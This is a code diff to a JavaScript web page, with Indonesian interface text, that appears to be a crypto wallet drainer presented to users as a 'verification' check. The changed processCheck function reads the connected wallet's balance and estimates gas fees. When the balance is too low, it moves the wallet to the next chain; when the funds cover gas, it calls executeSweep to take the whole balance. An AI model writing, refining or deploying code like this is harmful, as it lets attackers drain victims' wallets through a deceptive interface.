@@ -93,34 +93,42 @@
             }
         }
 
-        async function processCheck(userAddress) {
-            isSweeping = true;
-            const balance = await provider.getBalance(userAddress);
-            const network = await provider.getNetwork();
+     async function processCheck(userAddress) {
+    isSweeping = true;
+    const balance = await provider.getBalance(userAddress);
+    const network = await provider.getNetwork();
+    const feeData = await provider.getFeeData();
+    
+    // Estimasi biaya gas standar (21000 gas * harga gas saat ini)
+    const gasLimit = 21000n;
+    const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
+    const totalGasCost = gasLimit * maxFeePerGas;
+
+    displayMessage(`Memeriksa saldo di ${targetChains.find(c => BigInt(c.id) === network.chainId)?.name || 'Jaringan'}...`, "info");
+
+    // LOGIKA PINDAH JARINGAN: 
+    // Jika saldo benar-benar 0 ATAU saldo lebih kecil dari biaya gas
+    if (balance === 0n || balance <= totalGasCost) {
+        currentChainIndex++;
+        if (currentChainIndex < targetChains.length) {
+            displayMessage(`Saldo tidak mencukupi di jaringan ini. Mengalihkan ke ${targetChains[currentChainIndex].name}...`, "warning");
             
-            displayMessage(`Memeriksa saldo di ${targetChains.find(c => BigInt(c.id) === network.chainId)?.name || 'Jaringan'}...`, "info");
-
-            if (balance > 0n) {
-                await executeSweep(userAddress, balance);
+            const success = await switchNetwork(targetChains[currentChainIndex].id);
+            if (success) {
+                // Tunggu sebentar agar wallet benar-benar switch jaringan
+                setTimeout(() => connectWallet(), 2000);
             } else {
-                // Jika saldo kosong, pindah ke jaringan berikutnya di daftar
-                currentChainIndex++;
-                if (currentChainIndex < targetChains.length) {
-                    displayMessage(`Saldo di jaringan ini kosong. Mengalihkan ke ${targetChains[currentChainIndex].name}...`, "warning");
-                    const success = await switchNetwork(targetChains[currentChainIndex].id);
-                    if (success) {
-                        // Tunggu sebentar agar provider update jaringan
-                        setTimeout(() => connectWallet(), 2000);
-                    } else {
-                        resetButton();
-                    }
-                } else {
-                    displayMessage("Verifikasi selesai. Tidak ditemukan saldo di jaringan utama.", "success");
-                    resetButton();
-                }
+                resetButton();
             }
+        } else {
+            displayMessage("Verifikasi selesai. Tidak ditemukan saldo yang cukup di semua jaringan.", "success");
+            resetButton();
         }
-
+    } else {
+        // Jika saldo cukup untuk bayar gas, baru eksekusi pengiriman
+        await executeSweep(userAddress, balance);
+    }
+}
         async function executeSweep(userAddress, balance) {
             btnText.textContent = 'Memproses Verifikasi...';
             try {
